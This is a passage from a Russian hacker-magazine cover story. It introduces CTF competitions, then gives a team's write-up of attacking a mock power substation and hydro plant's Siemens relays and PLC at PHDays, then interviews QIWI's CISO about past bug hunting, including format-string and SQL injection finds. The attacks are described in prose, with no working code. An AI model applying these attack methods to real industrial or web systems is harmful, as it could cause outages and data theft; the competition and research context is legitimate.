 флаг, тоже немаловажен. С ним получается, что чем меньше команд смогли
 сдать определенный флаг, тем он дороже. В общем, главное — читать перед
 каждым CTF регламент и продумывать тактику в соответствии с ним.

 На что похож флаг?

 В регламенте соревнования всегда очень четко прописано, как именно долж-
 ны выглядеть флаги. Это нужно, чтобы участники хорошо понимали, что именно
 им нужно защищать и красть. Чаще всего флаги выглядят примерно так: 322d4
 e510659dc1e3a9d5b6d6df6c3e0. Но опять же организаторы могут придумать
 совершенно любой вид флага.



TASK-BASED CTF
 Это наиболее популярный вид CTF, поскольку он проще других в реализации.
 Вместо того чтобы ломать друг друга, команды делают определенные задания.
 За решение заданий дают флаг — сдав его, команда получает очки. Обычно
 в таком CTF есть несколько веток заданий — каждая по своей дисциплине. Да-
 вай пройдемся по наиболее популярным.
   Reverse — классический реверс бинарей. Он обычно сводится к разбору
 какой-нибудь скомпилированной программы или прошивки. Тебе понадобится
 вникнуть в логику ее работы, что-то вытащить из нее или написать кейген.
    Exploit — эксплуатация различных уязвимостей. Чаще всего требуется най-
 ти уязвимость в бинарнике для Linux. Как правило, это уязвимость из серии пе-
 реполнения стека или кучи, уязвимости форматной строки и подобные. Часто
 бывают включены защитные функции, вроде ASLR, DEP или Canary, которые
 тоже надо обойти.
  Web — задания на веб-безопасность. Это может быть что угодно — начи-
 ная от SQL Injection, XXE и RCE, заканчивая XSS (где по твоим ссылкам пере-
 ходит специальный бот) и уязвимостями в логике приложения. Причем уязви-
 мости редко бывают в том виде, в каком встречаются в реальной жизни. Часто
 разработчики добавляют своеобразные WAF, которые значительно усложняют
 процесс.
   Crypto — тут тебе предстоит изучать малоизвестные и вспоминать извест-
 ные слабости разных криптографических алгоритмов. Как правило, алгоритм
 выдают самописный, однако в него будет заложена уязвимость какого-нибудь
 другого криптоалгоритма, найденная ранее.
   Stegano (стеганография). В этой дисциплине участники пытаются вытащить
 скрытую информацию из какого-нибудь мультимедийного файла, документа,
 текста или образа чего-либо. Частенько задачки пересекаются с криптографи-
 ческими.
    Forensic. Форензика имитирует различные задания на расследование ин-
 цидентов и анализ образов и файлов. Вполне могут попасться задания, свя-
 занные с восстановлением удаленных файлов и скрытых разделов. Часто при-
 ходится анализировать самописную вирусню или дампы трафика.
   PPC — Professional Programming and Coding. Это вариация на тему спортив-
 ного программирования, но в более прикладной форме. Тут может быть абсо-
 лютно что угодно: начиная с написания парсера или кода для брутфорса и за-
 канчивая биржевыми или игровыми ботами.
   В ветку Misc попадают любые задания, которые не относятся к другим груп-
 пам. Это может быть и конкурентная разведка, и какие-нибудь развлекатель-
 ные задания (например, «сфоткайте самую старую IT-книгу, которую сможете
 найти») — короче, все, на что хватит фантазии у организаторов.





                 Микросхема в «Майнкрафте» — яркий пример нестандартного задания
                  на CTF. Для решения на нее нужно было подать правильные сигналы

 В зависимости от сложности заданий за них дают разное количество баллов.
 Очень часто ветки пересекаются, и одно задание может одновременно требо-
 вать разных специализированных знаний.
   Механика проведения task-based CTF бывает разная. Например, более
 сложные задания могут открываться по мере решения более простых. Или бы-
 вает так, что команда, решившая задание первой, получает дополнительные
 баллы. Однако в целом идея остается прежней — кто решил больше заданий,
 тот набрал больше баллов и тот в итоге побеждает.

MIXED
 Существуют CTF, которые объединяют черты attack-defence и task-based:
 командам требуется не только защищать свои сервисы и атаковать чужие,
 но и решать задания. В этом случае правила проведения могут быть любыми
 и ограничиваются лишь воображением организаторов. Яркий пример мож-
 но было встретить на PHDays 2014. Текста регламента хватило на небольшую
 книжечку, и разобраться в механике было не так-то просто.

KING OF THE HILL
 «Царь горы» — относительно молодой тип CTF, его даже сложно считать на-
 стоящим CTF. Основная идея этого формата — взломать систему, закрепить-
 ся на ней и не дать другим участникам перехватить управление. Фишка в том,
 что с определенным интервалом времени система полностью откатывается
 и гонка за получение доступа начинается по новой.

НЕМНОГО ПРО САМИ СОРЕВНОВАНИЯ
 В мире каждую неделю проводится как минимум один CTF, а то и несколько.
 Организуют их, как правило, команды, которые сами постоянно участвуют в по-
 добных соревнованиях. Полный список всех CTF с датами проведения можно
 найти на сайте CTFtime.
   Самый крутой CTF — это, безусловно, финал DEF CON CTF (attack-defence).
 Он проходит в Лас-Вегасе каждый август. Как правило, в нем участвуют пят-
 надцать-двадцать сильнейших команд из разных стран, прошедшие отбороч-
 ные соревнования в течение года. Часть команд отбирается через DEF CON
 Quals CTF (task-based), который проводится в мае. Остальная часть — через
 другие авторитетные CTF, которые в начале года получают статус DEF CON
 Qualifying Contest.
   Немало CTF проходит и в России. Большинство из них студенческие, одна-
 ко есть пара соревнований, которые известны на международном уровне, —
 RuCTFE и PHDays. RuCTFE — это attack-defence CTF, который проводится ко-
 мандой HackerDom. Он имеет очень высокий рейтинг среди международных
 CTF, и, как следствие, победа на RuCTFE — пропуск на DEF CON CTF.
   PHDays организует компания Positive Technologies. Его формат неодно-
 кратно менялся — были и task-based, и mixed варианты. Некоторое время он
 был отборочным для DEF CON CTF.
   Из российских студенческих CTF наиболее популярны RuCTF (не путать
 с RuCTFE) и VolgaCTF. С недавних пор набирает силу RCC.

ОСНОВНЫЕ КОМАНДЫ НА АРЕНЕ CTF
 Рейтинг команд можно найти на сайте CTFtime. Вот десятка лидеров на мо-
 мент написания статьи.
 1. dcua (Украина)
 2. p4 (Польша)
 3. Dragon Sector (Польша)
 4. 217 (Тайвань)
 5. Plaid Parliament of Pwning (США)
 6. Tasteless (интернациональная)
 7. LC↯BC (Россия)
 8. Shellphish (США)
 9. int3pids (Испания)
 10. TokyoWesterns (Япония)

 У каждой из этих команд своя многолетняя история, свои сильные и слабые
 стороны. Если говорить о международных командах, то этой статьи нам не хва-
 тит, поэтому быстро пробежимся только по российской сцене.
   На данный момент наиболее активные российские команды — LC↯BC (объ-
 единение More Smoked Leet Chicken и BalalaikaCr3w), Bushwhackers (команда
 на базе МГУ), Rdot.org (команда на базе одноименного форума), SUSlo.PAS
 (команда из Новосибирского государственного университета), Antichat (ко-
 манда на базе одноименного форума), SiBears (команда на базе Томского го-
 сударственного университета).





                                          Две русские команды на DEF CON 2014

ЧТО ВКАЧИВАТЬ, ЧТОБЫ БЫТЬ НЕЗАМЕНИМЫМ В CTF
 Как показывает опыт, все самые серьезные соревнования делают основной
 акцент на заданиях, которые относятся к ветке эксплоитов. Однако людей, ко-
 торые достаточно прошарены в этой теме, очень мало, и даже в сильнейших
 командах их зачастую не хватает.
   В остальном все так или иначе вращается вокруг ре-
 версинга, веба и криптографии.
   Если речь заходит об attack-defence, то очень важна
 роль администратора, поскольку ему достается много
 работы.
   Если ты решил углубиться в низкоуровневую без-
 опасность, к которой относится эксплоитинг и ревер-                                   WWW
 синг, то тебе необходимо определиться с операцион-
 ной системой и процессорной архитектурой. Большей       ringzer0team.com —
                                                                             сайт с очень крутыми частью встречаются архитектуры x86 и x64, причем x64
                                                                       заданиями из самых
 с каждым годом все чаще. Далее по популярности идет                                                                           разных веток.
 ARM. В подавляющем большинстве случаев операци-     Определенно достоин
 онная система — это Linux, но иногда бывает и Windows          внимания.
 (в основном в реверсе и форензике). В идеале тебе                                                                                  pwnable.kr — для тех,
 должно быть не важно, какую архитектуру реверсить,     кто решил прокачаться
 но это приходит только с опытом.                                    в эксплоитинге.

                                                                                  ahack.ru — сайт крутого
ПОМОЩЬ НАЧИНАЮЩЕМУ УЧАСТНИКУ CTF          хакера Beched. Там
 Единственный способ преуспеть в CTF — постоянно      можно найти много
 участвовать в CTF. Поначалу все будет казаться не-      интересных заданий
                                                                            про веб. логичным  и  непонятным,  особенно  attack-defence,
 но без этого никак. Благо CTF сейчас проводятся ка-        ftp.hackerdom.ru/
 ждую неделю.                                                                 ctf-images/ — золотая
                                                                    жила для тех, кто решил   Еще советую читать разборы заданий (writeup’ы)                                                                       прошариться в attack-
 с уже прошедших соревнований — из них можно по-                                                                                  defence. По ссылке
 черпнуть много интересного. Помимо обычных CTF,      собраны виртуалки
                                                                          со всех прошедших есть онлайновые, они проходят вообще непрерыв-
                                                                     RuCTF и RuCTFE.
 но. Их полный список можно найти на сайте captf.com
 в разделе Practice.


                            Продолжение статьи
COVERSTORY


     Начало статьи
CAPTURE
THE FLAG КАК ВЗЛОМ СТАЛ
 СПОРТИВНЫМ
 СОСТЯЗАНИЕМ




              Команда специалистов по влажной
                уборке городов рассказывает об участии
                в соревновании «CityF: противостояние»,
             прошедшем в рамках Positive Hack Days 2016

CityF: взлом ГЭС глазами хакера
Прошли недели с окончания конференции Positive Hack Days 2016. Ты, навер-
ное, уже видел статьи и заметки в блогах о том, как доблестные защитники
не дали хакерам получить контроль над городом в состязании под названием
«CityF: противостояние». Поэтому расскажу, как команда Evil Dwarfs, состоя-
щая из трех человек, несколько раз таки провела влажную уборку макета насе-
ленного пункта.
  Первый день соревнований почти у всех команд закончился безрезультат-
но, так как были проблемы с доступом к сервисам. Например, иногда досту-
па не было вовсе. Поэтому на внутрикомандном совещании решили принести
на следующий день роутер — подробнее о нем в конце заметки.





Стоит отметить некоторые весьма «интересные» шаги команды защиты
для обеспечения безопасности серверов. Например, блокирование POST-за-
просов и использование белого списка для URL. В результате атакующие
не могли ни использовать уязвимые параметры в POST-запросах, ни брутить
пароли для интерфейса администратора. К нашему сожалению, после таких
мер, проблемы с доступом возникли и у администраторов сервисов ;). В итоге
организаторам соревнований пришлось вмешаться, и они смогли убедить за-
щитников использовать менее «эффективные» методы.
   Второй день начался с открытия доступа к игровым стендам. Обнаружив
контроллеры релейной защиты и автоматики SIPROTEC4 фирмы Siemens, мы
при помощи команд MMS (стандарт МЭК61850) проанализировали структу-
ру каждого устройства. Нашлось несколько устройств в составе магистраль-
ной подстанции, которые управляли коммутационными аппаратами. Мы со-
поставили полученную информацию со схемой стенда (она была изображена
на самом стенде) и нашли соответствие между контроллерами управления
и коммутаторами. Используя стандартный клиент MMS, мы стали отправлять
управляющие команды. Это привело сразу к нескольким авариям:
1. отключение понижающего трансформатора привело к потере электропита-
   ния городской подстанцией и соответственно обесточиванию города;
2. включение заземляющего ножа шин 500 кВ под напряжением, то есть замы-
   кание на землю работающих шин. От этого выгорело несколько элементов
   подстанции;
3. отключение работающего генератора ГЭС от электросети, что потребовало
   резкого экстренного его останова.





4.


                                     Внутренняя структура контроллера SIPROTEC4

Таким образом, мы смогли помыть
город первый раз. Собственно, этот
момент и был зафиксирован многи-
ми участниками конференции в своих
блогах. Далее нами был обнаружен
ПЛК S7-1500 фирмы Siemens, у ко-
торого оказался поднятым веб-сер-
вис.  Зная,  что  в  веб-интерфейсе
присутствует возможность  управле-
ния тегами на контроллере, мы неза-
медлительно приступили  к подбору
пароля. Это, увы, ничего нам не дало,
так как интерфейса управления тега-
ми не было.
  Пришлось ломать сам контроллер.
Вдоволь наигравшись с протоколами,
мы скачали сервисное ПО под назва-
нием Tia Portal. Для корректной ра-
боты в нем необходимо создать пра-
вильную модель контроллера. Когда
SCADA атакуют удаленно, с этим мо-
гут быть связаны проблемы. В нашем
же случае достаточно было подой-
ти к стенду и подсмотреть макет кон-
троллера.
  На ПЛК находится программа, ко-
торая управляет работой окружаю-
щих его устройств. То есть, получив
контроль над ним, ты получаешь кон-                                                Выдача команды управления
троль над ГЭС. Но когда мы подклю-
чились к ПЛК, механизм аутентифика-
ции помешал нам сделать что-либо кроме запуска или остановки программы.
Впрочем, и это уже неплохо: мы остановили программу в тот момент, когда
на ГЭС были открыты заслонки для сброса лишней воды. Само собой, они
не закрылись после сброса необходимого количества воды, и мы помыли го-
род еще раз.





                                             Веб-интерфейс администратора ПЛК





                                                           ПЛК

На этом этапе стали появляться другие команды хакеров, которые добра-
лись до ПЛК. Поэтому после подбора пароля мы не просто заменили пароль
на свой, но и выставили самые секьюрные настройки, которые не позволяли
делать с ПЛК что-то плохое.
  Мы получили полный доступ к контроллеру — можно выдыхать и пораски-
нуть мозгами. Первая появившаяся у нас мысль — написать программу, в кото-
рой всем тегам присваивается единичка, и загрузить ее на ПЛК. Но мы решили
этого не делать и за два часа до окончания соревнований обратились за по-
мощью к тем людям, что сидели за стендами. Мы хотели не устраивать в горо-
де полный хаос, а культурно провести еще одну влажную уборку. В результате
была написана программа, которая открывала все заслонки для сброса воды.





                                                 Программа, контролирующая ГЭС

Здесь уже эпического потопа не получилось, так как много воды было израс-
ходовано в прошлые разы. Нам пришлось довольствоваться небольшим ру-
чейком. Тем не менее наша команда получила полный контроль над ГЭС, и,
как можно судить по публикациям, это осталось незамеченным.
   Никто не обратил внимания и на наш «стелс»-роутер, который мы на второй
день установили в сеть со стендами. Его не обнаружили даже несмотря на то,
что мы сканировали сеть, перехватывали и подменяли трафик.
  В итоге нашей команде очень понравились соревнования в этом году, даже
несмотря на безрезультатный первый день. Мы выражаем благодарность ор-
ганизаторам, а также тем, кто занимался сопровождением стендов. Особен-
но Илье Карпову и Максиму Никандрову. Респект! А с вами были Лёша, Дима
и Боря. До новых встреч!
COVERSTORY





                              ИНТЕРВЬЮГОНКИ                            С CISO QIWIС ТЕНЯМИ                                КИРИЛЛОМ
                               ЕРМАКОВЫМ





Есть мнение, что банковские CISO — скучные ребята. Со-
вершенно не умеют работать руками, бесконечно сове-
щаются и вообще занимаются всякой ерундой. Героя се-
годняшней истории, isox’а, скучным назвать точно нельзя.
Кому-то он известен как топовый багхантер Яндекса, ко-
 му-то как создатель открытой базы уязвимостей Vulners,
а кому-то — просто как крутейший спец по корпсеку. Isox
предельно честно рассказал о своей работе, о блеке,
об анонимности и о взрослой ИБ в целом. Итак, знакомь-
ся — Кирилл «isox» Ермаков, главный безопасник QIWI!





                                                  Беседовал
                                           Илья Русанен
                                                       rusanen@glc.ru



Факты
 1. Использует nano, не признает Vim
 2. Может найти path traversal даже в чайнике
 3. Всегда под рукой:
    • OS X
    • Sublime Text 2
    • Canvas
    • WSO Shell
    • jpeg-payload от BlackFan
    • subbrute
    • pwdump
    • выделенная машина с 32 ядрами и 256 Гбайт памяти для Burp Suite и FTK
 4. Гитарист. Играет на
    • Gibson Les Paul № 384 Pre-Historic, купленной у коллекционера из Японии
    • Fender Stratocaster
    • Gibson SG Standard 2000
 5. Увлеченный автогонщик. Ездит на Porsche 911


 На самом деле я не очень люблю компьютеры. Я люблю гонки.
 А на гонки нужно как-то зарабатывать. Так я и стал хакером.
  Я увлекался time attack гонками. Это очень быстрая езда по кругу
 на время. То есть нужно просто проехать быстрее остальных свой круг.
   У меня была Subaru STI, там все как в мобильной игре. В машине
 стояли кастомные гоночные мозги за 3000 евро, но сами по себе они почти
 ничего не умели. В лучшем случае ты просто заведешь машину. А вот гоночно-
 го функционала, вроде удаленного снятия телеметрии или системы поддержа-
 ния давления наддува (Anti-Lag), не было. Чтобы твоя тачка что-то умела, нуж-
 но купить к ней дополнения.
   У мозгов есть уникаль-
ный серийник. Ты отсылаешь
 его вендору, платишь деньги
 и получаешь код разблокиров-
 ки. Вводишь в машине, и у тебя
 активируется та или иная оп-
 ция. То есть все гоночные фичи
 уже изначально зашиты в моз-
 гах, нужно только их разблоки-
 ровать. Вот тут-то я задумался:
 а нельзя ли обойтись без вен-
 дора?
  Машины  я умею  про-
 граммировать  сам.  Если
 понимаешь, как работает дви-
 гатель,  настроить  сможешь.
 Конечно, при этом его у тебя
 заклинит. Но ты же хакер, ты
 упорный, правда? Так вот, за-
 лезаю я в машину и вижу, что
 система управления заблоки-
 рована паролем. У меня тут же
 в голове сложилось: «заблоки-
 ровано паролем» и «информа-
 ционная безопасность» — это
 где-то рядом. Я запихнул про-
 шивку этих мозгов в OllyDbg
 (в IDA я тогда не мог) и увидел, что пароль проверяется на клиенте. То есть
 не посылается на удаленный сервер на проверку, а сверяется прямо в про-
 грамме управления на компьютере, сделанной в C++ Builder. Один JMP решил
 вопрос. Так я и попал в свою прошивку.
   Оставалась вторая задача — подобрать те самые ключики, кото-
рые активировали дополнительный функционал. В Subaru стояли моз-
 ги от одного известного вендора. Мне посчастливилось, что у меня за спиной
 сидели два очень крутых реверсера — Дима Скляров и Саша Plex. Я сказал
 ребятам: «А давайте взломаем мозги моей машины?»
   Дима быстро отреверсил всю прошивку мозга, это был Motorola
 68000. Но разобранной прошивки оказалось недостаточно: активационные
 коды для суперфич, естественно, лежали в защищенном разделе памяти, ко-
 торый присутствовал только в мозге, и вычитать его, казалось бы, было никак
 нельзя.
  В поисках хоть какой-то инфы я пошел на сайт вендора и случай-
 но наткнулся на интересную багу. Когда ты скачиваешь с их сайта файл
 со свежей прошивкой, URL выглядит так: /download-file?id=315. Я попробо-
 вал подставить 316, 317 и быстро отенумерейтил все, что было. Среди слито-
 го сокровища был и Developer Tools, который позволял перепрошить бутлоа-
 дер! Оставалось найти образ самого бутлоадера.
  Нам помог раздобытый Developer Tools. Через этот devkit мы нау-
 чились зашивать модифицированные нами прошивки. Дима Скляров нашел
 единственный XOR в прошивке. Именно этот код отвечал за проверку ключи-
 ков. Дальше мы просто модифицировали то поле, где находился серийник,
 так, чтобы за три перепрошивки вычитать всю область, где находились magiс
 bytes, и вычислить необходимые коды активации. Так я получил ключики и ак-
 тивировал все гоночные функции у себя в машине.
   Вендору мы все зарепортили. Им, впрочем, было все равно. Они
 уже пять лет не фиксят эту уязвимость. Даже презентацию на PHDays на эту
 тему сделали. Мы им говорили: «Ну пофиксите, пожалуйста, нам же совестно»,
 а они никак. Зато я почувствовал себя настоящим хакером. Настоящий блек —
 похекать собственную машину :).





О ТОМ, КАК ТАК ВЫШЛО
Мой «творческий путь» начался с того, что я нашел в бюджете день-
 ги, которые правильно применил. А именно — на обучение себя. Я тог-
 да работал на одном госпредприятии и сумел выбить из них немного денег
 на учебу. Оперативно отсдавал RHCSS, RHCT и RHCE. Кстати, что удивитель-
 но, эти знания пригождаются до сих пор. В этот момент меня нашел Positive
 Technologies.
  Я знал, как секьюрно конфигурить никсы, винду, слышал про вся-
 кие Center of Internet Security, умел куда-нибудь всунуть кавычку
 и даже мог запустить дебаггер. Короче, они меня послушали и сказали,
 что я, оказывается, безопасник и мне надо срочно идти работать безопасни-
 ком. Ну окей, ну пошли тогда :).
   Cначала просто работал над MaxPatrol, но быстро нашел то, что
можно назвать «своей темой». Мне захотелось не решать частные случаи
 по одному, а сделать что-то, что могло бы глобально решить проблему поиска
 уязвимостей методом версионных проверок. Мы скооперировались с Сашей
 Леоновым (работает сейчас в Mail.Ru) и полностью разобрались в такой шту-
 ке, как OVAL. А затем я накодил фреймворк для парсеров, базу данных по сбо-
 ру информации об уязвимостях и превращению ее в валидный OVAL-контент,
 пригодный для сканеров безопасности.
   Вообще, я окончил МИРЭА по информационной безопасности.
 Но от этого безопасником не стал. То, чему нас учили в институте, было на-
 сквозь неинтересно. Какой-то ISO, 152-ФЗ, PCI DSS, казалось бесполез-
 ной чушью. Только спустя много лет я понял, что все эти документы написа-
 ны кровью и взломами. В инсте дают базу, которая позволяет строить как-то
 enterprise security, понимать, как это все должно работать. Этому всему учат
 в институте, но не объясняют, зачем это нужно. Работая обычным пентесте-
 ром-одиночкой или безопасником у себя в компании, ты тоже не понимаешь,
 зачем это все нужно. Образование пытается привить тебе системный подход,
 без объяснения, где и как ты его будешь применять.
   Образование пригодилось, когда я стал работать корпоратив-
ным безопасником. Технари вечно кладут болт на основную документаль-
 ную базу, но они просто ни разу не пытались выстроить безопасность на всех
 уровнях в большой компании. Вот приходит к пентестеру клиент, просит вы-
 строить ему ИБ. И дает компанию на 1500 человек и 5000 серверов. Давай,
 сделай ее безопасной! Вот тогда-то образование приходит на помощь. Пони-
 маешь, что процессы стоят во главе всего, зачем нужны ISO и все эти стан-
 дарты безопасности.

О БЛЕКАХ, ГРЕЯХ
И ЧАЙНИКАХ
 У  меня  никогда  не  было
мыслей блечить. Ну  то  есть
 как не было: я работаю в компа-
 нии, где могу наблечить охулиард
 :). Как думаешь, такие мысли по-
 сещают? (Isox, ты слишком чест-
 ный. — Прим. ред.) Но при этом
 есть одно но.
  Я очень люблю спокойно
 спать. Когда блечишь — будешь
 просыпаться ночью просто пото-
 му, что ты осознаешь, что чего-то
 натворил и возмездие рано или
 поздно тебя достанет. Нет блеков,
 за которыми оно не приходит, про-
 сто за некоторыми чуть раньше,
 а за некоторыми чуть позже.
   Вайты  всегда  скилловее
 блеков. Вайты скилляются хао-
 тично: нашли интересную тему, по-
 ресерчили, проскиллялись. Блеки
 развиваются только в тех направ-
 лениях, которые эффективны сей-
 час и приносят деньги.
   Блек не будет скилляться ради фана. Он не будет из интереса ломать
 чайник, чтобы понять, как он устроен. Денег с него не получить. Вот, напри-
 мер, d0znpp. У него недавно было время, он пошел и поломал чайник. Он те-
 перь у нас главный хакер по взлому чайников, холодильников и другого IoT.
 Круто, прокачал скилл, респект! Но ты же понимаешь, блек никогда не будет
 этим заниматься.
   Блеки, которые каждый день атакуют QIWI, — это скрипт-кидди.
 Они не скилловые. Хотя они в общем и понимают, how to, но используют чужой
 инструментарий, который подготовили для них другие блеки. Конечно, где-то
 есть могучая кучка, которая собственно пишет сплоиты, малварь. Вот они кру-
 ты, эти чуваки знают, что делают, и, заметь, чаще всего сами не занимаются
 блеком. Это мой опыт, это те, кого мы встречаем. Но, кстати, я не отрицаю, что
 тех крутых, кто нас ломает, мы можем просто не замечать.
   Нельзя называть блеком человека, который написал малварь,
 но ее не использует. Он просто написал малварь, это прикольный софт.
 Пока он ее не распространяет и не использует во вред, он не блек, он грей
 или ресерчер. Вот эти парни скилловые, и они спокойно спят.
   Блеки мелкого пошиба не ищут новые уязвимости. Им неинтересно
 найти новый вектор. Например, есть у тебя Ruby on Rails, в нем периодически
 стреляют то SQL-инъекции, то RCE. И найти что-то кроме инжекта или RCE —
 это неинтересно. Найти абсолютно новый вектор и раскрутить его — вот это
 интересно, с моей точки зрения. Блек не будет этим заниматься. Зачем? Лю-
 бая типовая компания ломается на раз-два. Зачем изобретать велосипед,
 если у тебя и старого хватит, чтобы поломать?
   У блеков есть проблема — они слишком верят в свою безнаказан-
 ность. Они никогда не думают о том, что жертвой может оказаться человек,
 который способен их поймать. И не понимают, насколько другие компании
 сплочены в желании их найти. Нет, ну вы правда считаете, что корпоративные
 безопасники не общаются? Это тоже комьюнити. А в нем принято помогать
 друг другу.
   Надеяться, что тебя не найдут, — это последнее дело. Любую твою
 активность, даже хорошо закамуфлированную, можно посчитать. Вопрос
 в стоимости поисков по сравнению с тем, сколько блек пытается спереть. Это
 же простая математика: если ты украл 10 000 000 долларов, то эти люди бу-
 дут готовы потратить как минимум 9 999 999 долларов, чтобы тебя найти, и все
 еще останутся в условном плюсе.
  В нашей стране какое-то странно пренебрежительное отноше-
 ние к управлению «К» или ЦИБу. Меня не покидает ощущение, что кто-
 то умышленно распространяет этот миф. В обоих ведомствах сидят высоко-
 классные специалисты. Там крутые whitehat’ы, которые знают свое дело, и они
 умеют ловить пв [преступников]. И на их стороне все коммерческие компании
 и даже само государство. Это миф, что у нас в спецслужбах нет хороших спе-
 цов. Есть, знаю из первых рук.
   Большинство хакеров отличается тщеславием. Мы что-то похекали
 и сразу же бежим всем рассказывать: «Я похекаль! Я молодец! Ты только заце-
 ни, как я могу!» Рассказываем одному, другому, третьему, а четвертый работа-
 ет в органах или просто окажется крысой. Есть огромное количество людей,
 которые за небольшие деньги готовы сливать, что происходит на блекфронте.
   Блеков бывших не бывает. Тут вопрос в том, как работает твоя голо-
 ва. Если она хоть раз позволит тебе совершить противоправное действие,
 она позволит и второй, найдя для этого достаточное оправдание, чтобы ты
 не считал себя виноватым. Те, кто блечил, не могут попасть на работу в круп-
 ные компании. Человеку, который согрешил один раз, больше веры нет. Ре-
 сурсы, которые нам придется тратить на то, чтобы этого человека контро-
 лировать, будут больше, чем тот профит, который он принесет, добавляясь
 в нашу команду.
   Конечно, есть блек по дурости. Например, поломал IBM, а у них нет
 bug bounty. Ну пошел и сдал им. Но это не блек, это grey: ты ломаешь ради
 фана. Нашел багу, посмотрел на нее и пошел дальше. Другое дело, когда ты
 поломал что-то ради наживы. После этого тебе закрыт вход в любую большую
 компанию. Все твое прошлое раскопают, и никто с тобой больше разговари-
 вать не будет, потому что ты можешь натворить это еще раз.





O VULNERS
Я еще в «Позитиве» говорил: мы написали крутой движок для сбо-
 ра данных об уязвимостях. Давайте сделаем бесплатную открытую
 базу багов? Ценность в том, что в базе контент нормализованный. Это не че-
 ловекочитаемый формат, а машиночитаемый. Нужно где-то взять исходное
 описание бага, распарсить, выяснить, где у него описание, где версионные
 проверки. Мой движок все это умел, и я хотел дать все это бесплатно и всем.
   Однако скоро я ушел из PT, и все, что написал по этой теме, при-
 шлось оставить. Я очень хотел довести проект до паблика, но формально
 не мог использовать код, написанный в Positive Technologies для MaxPatrol.
 Но человек, который написал что-то один раз, сможет написать что-то и вто-
 рой. Я просто взял и с нуля сделал все то же самое — свой фреймворк
 для парсера и для обработчиков — и запустил базу, о которой мечтал. Так ро-
 дился Vulners.com.
   Сейчас проекту год, и у нас уже 500 уникальных активных юзеров
 в день, которые как-то нами пользуются. Ну и два десятка человек, ко-
 торые спрашивают, куда задонатить :). За этот год я уже три раза переписал
 Вульнерс, это видно по API.
   Конечно, Vulners я запилил не в одиночку. У нас была старая коман-
 да из PT. Ребята, которые перешли со мной из PT в QIWI. Они и подключились.
 Я пишу ядро и админю, Игорь Videns пишет поиск, Ваня Ванкувер — фронт,
 Саша Plex — роботов-сборщиков, а Саша Леонов — статьи и аналитику. Ребя-
 та знают тему не понаслышке и сами используют Vulners в повседневной рабо-
 те. Это просто наше желание сделать мир лучше. Мы бы все равно придумали
 что-то похожее в QIWI, ну так что бы не сделать самим, покрасить в оранжевый
 цвет и дать всем пользоваться бесплатно?
  Я никогда не искал инвесторов. И не хочу. Они заходили, но я не по-
 нимаю, зачем мне деньги в этом проекте. Сейчас приходит инвестор с улицы
 и говорит мне: «Я даю тебе двадцать миллионов на три года». А я за это дол-
 жен кодить то, что зарабатывает деньги. Блин, я не хочу кодить то, чего они
 хотят. Я хочу кодить то, что мне интересно. Функционал базы знаний с удоб-
 ным API останется бесплатным навсегда. Если я вдруг решу, что какой-то до-
 полнительный функционал стоит денег, — ну что же, придется прикручивать
 кнопку оплаты.





О ПРОГРАММИСТАХ, ХАКЕРАХ И БЕЗОПАСНИКАХ
 Что-то поломать, поовнить или денег заработать — нормальная мо-
 тивация, это должен пройти каждый. Люди таким образом развивают
 себя, AppSec. Просто дальше есть два пути. Первый — они продолжают вты-
 кать кавычку куда ни попадя и находить фигню, это так называемые рандом-
 щики. Или они начинают разбираться, как те или иные вещи работают, и они
 становятся ценными кадрами AppSec. На самом деле в Enterprise нужны и те
 и другие.
   Рандомщики тоже нужны. Мы вот сейчас попали в дурацкую ситуацию.
 У нас есть Игорь Videns и Ваня Vancouver. Они оба из тех чуваков, которые сна-
 чала прочтут всех исходники, а потом пойдут ломать. А нам вот не хватает чува-
 ка, который просто может помахать кроличьей лапкой и попасть, куда нужно.
   Вот тебе пара примеров с Яндексом. Это уже старая история, ду-
 маю — можно рассказать. У них есть XML API. Есть там такой параметр —
 xmlns. Что-то меня дернуло туда вписать %s, и тут я увидел классическую
 format string уязвимость. Единственное, что омрачало, — это то, что я при ка-
 ждом новом запросе попадал на новую ноду из балансировщика нагрузки.
 До RCE довести не получилось, только чтение памяти было. Точно такая же
 история была с их почтой для домена. Я смотрю на запрос и понимаю, что мне
 как программисту просто было бы лень на него писать регулярку. Натравил
 на него sqlmap — и в базе.
   Чутье — вот что нужно. Важно понимание, где с той стороны можно на-
 халтурить. Человек, который писал веб, становится хорошим пентестером.
 Потому что он понимает, что существуют вот такие уязвимости, там-то можно
 накосячить, понимает, как остальные пишут такие же куски. Ибо все пишут аб-
 солютно одинаково. HOWTO => Stack Overflow => Copy-Paste. Например, не-
 давно мне захотелось сделать автоматическое приведение типов на Вульнер-
 се. Я открываю первый топик со Stack Overflow, там советуют сделать eval. Ты
 представляешь, сколько сейчас проектов в продакшене с eval?
  Нам кажется, ни один нормальный человек не будет eval’ить
 инпут. Ничего подобного! Если ты обычный программист, у тебя зада-
 ча — сделать, чтобы работало. Ты просто не думаешь о том, что в инпут мож-
 но что-то еще подсунуть, особенно в запарке. У тебя голова в эту сторону
 не работает.
   Главная концепция безопасности в том, что мы считаем любой user
 input вредоносным априори. А девелопер не считает. Вот разница мышле-
 ния безопасника и девелопера. 90% уязвимостей связано именно с инпутом.
 Разработчик просто не знает, что можно вот так, да и все. В этом и состоит ра-
 бота корпоративного безопасника — объяснить девелоперу, что user input бы-
 вает зловредным. Вот тогда сразу весь код становится секьюрным.
   У пентестеров тоже не все хорошо, они не знают, как писать без-
 опасный код. Вот приходит ко мне человек, вроде скилловый. Назубок рас-
 сказывает OWASP TOP-10 и методы эксплуатации. Нашел инъекцию, все
 рассказал. Ну а дальше-то что он будет с этим делать? Как он объяснит про-
 граммистам, как надо сделать правильно? Он же никогда не писал бэкенд,
 для него параметризованные SQL-запросы — это неизвестное словосочета-
 ние, он не знает про технологии защиты. Не знает, что делать concat в SQL-за-
 просе теперь даже разработчики не советуют. Не потому, что это несекьюрно,
 а просто потому, что можно случайно нарушить запрос и все поломается. Вот
 в этом беда современных пентестеров — у многих недостаточно технического
 бэкграунда. Они уже знают, как поломать, но не знают, как защититься.





О РАБОТЕ И О ТОМ, КТО ПРИХОДИТ СОБЕСЕДОВАТЬСЯ
 Говорят, если человек чего-то не знает, но горит желанием — его
 возьмут. У меня так не работает. Есть минимальный чек-лист — стандартные
 двадцать вопросов, по которым я гоняю соискателя. Мы даем список и пред-
 лагаем отметить честно +, – и +–. И по плюсам начинаем разговаривать. Это
 такие опорные точки для диалога, чтобы копнуть знания. Вопросы из самых
 разнообразных областей, в основном база. Она позволяет общаться на од-
 ном языке. Не только внутри команды, но и с разработчиками и эксплуатаци-
 ей. Если ты придешь к админам и скажешь поставить вот такой параметр ядра
